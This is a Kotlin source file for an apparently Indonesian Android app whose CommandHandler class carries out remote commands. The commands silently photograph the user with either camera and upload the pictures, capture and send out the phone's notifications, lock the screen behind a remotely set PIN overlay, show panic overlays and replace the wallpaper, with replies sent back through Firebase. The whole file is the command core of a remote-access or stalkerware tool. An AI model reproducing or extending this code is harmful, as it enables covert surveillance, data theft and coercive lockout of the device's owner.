package com.sanz.epep.domain

import android.app.WallpaperManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.BitmapFactory
import android.os.BatteryManager
import android.util.Log
import com.sanz.epep.camera.SilentCameraCapture
import com.sanz.epep.data.local.PrefsManager
import com.sanz.epep.data.remote.FirebaseResponder
import com.sanz.epep.overlay.OverlayManager
import com.sanz.epep.service.NotificationService
import kotlinx.coroutines.*
import java.io.File
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class CommandHandler(private val context: Context) {

    private val TAG = "CommandHandler"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val cameraCapture = SilentCameraCapture(context)

    fun handleCommand(command: String) {
        Log.d(TAG, "handleCommand: $command")
        val cmd = command.trim()
        val cmdLower = cmd.lowercase()

        when {
            cmdLower == "/status"              -> handleStatus()
            cmdLower == "/foto_depan"          -> handlePhoto(true)
            cmdLower == "/foto_belakang"       -> handlePhoto(false)
            cmdLower.startsWith("/kunci ")     -> handleLock(cmd)
            cmdLower.startsWith("/buka ")      -> handleUnlock(cmd)
            cmdLower == "/panik_on"            -> handlePanicOn()
            cmdLower == "/panik_off"           -> handlePanicOff()
            cmdLower.startsWith("/pesan ")     -> handleMessage(cmd)
            cmdLower.startsWith("/bg ")        -> handleBackground(cmd)
            cmdLower == "/bg_reset"            -> handleBgReset()
            cmdLower.startsWith("/wallpaper ") -> handleWallpaper(cmd)
            cmdLower == "/notif"               -> handleNotif()
            else -> reply("❓ Command tidak dikenali")
        }
    }

    private fun handleStatus() {
        val bat = getBatteryLevel()
        val lock = if (OverlayManager.isLocked()) "🔒 Terkunci" else "🔓 Terbuka"
        val panic = if (OverlayManager.isPanicActive()) "🔴 AKTIF" else "⚪ Tidak aktif"
        val bg = if (PrefsManager.lockBgUrl.isNotEmpty()) "🖼 Custom" else "⬛ Default"
        reply("✅ App Aktif\n\n🔋 Baterai: ${bat}%\n🔒 Kunci: $lock\n🔴 Panic: $panic\n🖼 Lock BG: $bg\n📅 ${time()}")

        // Update status ke Firebase
        scope.launch {
            FirebaseResponder.sendStatus(mapOf(
                "battery" to bat,
                "locked" to OverlayManager.isLocked(),
                "panic" to OverlayManager.isPanicActive(),
                "timestamp" to System.currentTimeMillis()
            ))
        }
    }

    private fun handlePhoto(front: Boolean) {
        val cam = if (front) "depan" else "belakang"
        reply("📸 Mengambil foto $cam...")
        cameraCapture.capture(front, object : SilentCameraCapture.CaptureCallback {
            override fun onCaptureSuccess(file: File) {
                scope.launch {
                    val ok = FirebaseResponder.sendPhoto(file, "📸 Foto $cam — ${time()}")
                    if (!ok) reply("❌ Gagal kirim foto $cam. Pastikan Flask aktif di Termux.")
                    try { file.delete() } catch (_: Exception) {}
                }
            }
            override fun onCaptureError(error: String) {
                reply("❌ Gagal foto $cam: $error")
            }
        })
    }

    private fun handleLock(text: String) {
        if (OverlayManager.isLocked()) { reply("🔒 Sudah terkunci"); return }
        val content = text.substringAfter("/kunci ").trim()
        if (content.isEmpty()) { reply("⚠️ Format: /kunci <pesan> <pin4digit>"); return }
        val parts = content.split(" ")
        val pin = parts.last()
        if (pin.length != 4 || !pin.all { it.isDigit() }) {
            reply("⚠️ PIN harus 4 digit!"); return
        }
        val msg = parts.dropLast(1).joinToString(" ").trim()
        if (msg.isEmpty()) { reply("⚠️ Pesan tidak boleh kosong!"); return }
        PrefsManager.lockPin = pin
        PrefsManager.lockMessage = msg
        OverlayManager.showLock(context)
        reply("✅ HP dikunci 🔒\n📝 \"$msg\"\n🔑 PIN: $pin")
    }

    private fun handleUnlock(text: String) {
        if (!OverlayManager.isLocked()) { reply("🔓 Tidak terkunci"); return }
        val pin = text.substringAfter("/buka ").trim()
        if (pin == PrefsManager.lockPin) {
            OverlayManager.hideLock(context)
            PrefsManager.lockPin = ""
            PrefsManager.lockMessage = "Perangkat Terkunci"
            reply("✅ HP dibuka 🔓")
        } else {
            reply("❌ PIN salah!")
        }
    }

    private fun handlePanicOn() {
        if (OverlayManager.isPanicActive()) { reply("🔴 Sudah aktif"); return }
        OverlayManager.showPanic(context)
        reply("🔴 PANIC MODE AKTIF")
    }

    private fun handlePanicOff() {
        if (!OverlayManager.isPanicActive()) { reply("⚪ Tidak aktif"); return }
        OverlayManager.hidePanic(context)
        reply("✅ Panic OFF")
    }

    private fun handleMessage(text: String) {
        val msg = text.substringAfter("/pesan ").trim()
        if (msg.isEmpty()) { reply("⚠️ Format: /pesan <teks>"); return }
        OverlayManager.showMessage(context, msg, 10000L)
        reply("✅ Pesan terkirim: \"$msg\"")
    }

    private fun handleBackground(text: String) {
        val url = text.substringAfter("/bg ").trim()
        if (url.isEmpty() || (!url.startsWith("http://") && !url.startsWith("https://"))) {
            reply("⚠️ Format: /bg <url_gambar>"); return
        }
        PrefsManager.lockBgUrl = url
        reply("✅ Background lock screen diupdate!")
    }

    private fun handleBgReset() {
        PrefsManager.lockBgUrl = ""
        reply("✅ Background direset ke default")
    }

    private fun handleWallpaper(text: String) {
        val url = text.substringAfter("/wallpaper ").trim()
        if (url.isEmpty()) { reply("⚠️ Format: /wallpaper <url>"); return }
        reply("🖼 Mengganti wallpaper...")
        scope.launch {
            try {
                val bmp = BitmapFactory.decodeStream(URL(url).openStream())
                if (bmp == null) { reply("❌ Gagal load gambar"); return@launch }
                WallpaperManager.getInstance(context).setBitmap(bmp)
                reply("✅ Wallpaper berhasil diganti!")
            } catch (e: Exception) {
                reply("❌ Gagal ganti wallpaper: ${e.message}")
            }
        }
    }

    private fun handleNotif() {
        reply("🔔 Memantau notifikasi 30 detik...")
        NotificationService.startMonitoring()
        scope.launch {
            delay(30_000L)
            val notifs = NotificationService.getAndClearNotifs()
            if (notifs.isEmpty()) {
                reply("📭 Tidak ada notifikasi baru selama 30 detik")
            } else {
                reply("📬 ${notifs.size} notifikasi:")
                notifs.forEachIndexed { i, msg ->
                    delay(300L)
                    reply("${i + 1}. $msg")
                }
            }
        }
    }

    private fun reply(text: String) {
        scope.launch {
            try { FirebaseResponder.sendResponse(text) }
            catch (e: Exception) { Log.e(TAG, "reply err: ${e.message}") }
        }
    }

    private fun getBatteryLevel(): Int {
        return try {
            val i = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val lv = i?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val sc = i?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
            (lv * 100) / sc
        } catch (_: Exception) { -1 }
    }

    private fun time() = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())

    fun destroy() { scope.cancel() }
}
